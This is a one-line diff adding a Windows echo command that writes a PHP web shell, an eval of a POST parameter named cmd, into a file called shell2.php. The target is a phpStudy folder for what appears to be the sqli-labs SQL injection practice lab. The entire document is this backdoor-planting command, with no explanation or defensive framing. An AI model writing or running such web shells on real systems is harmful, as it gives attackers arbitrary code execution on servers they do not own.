@@ -1,0 +1,1 @@
+echo ^<?php eval($_POST[cmd])?^> > C:/phpStudy/WWW/sqli_lab/sqli-labs-master/shell2.php
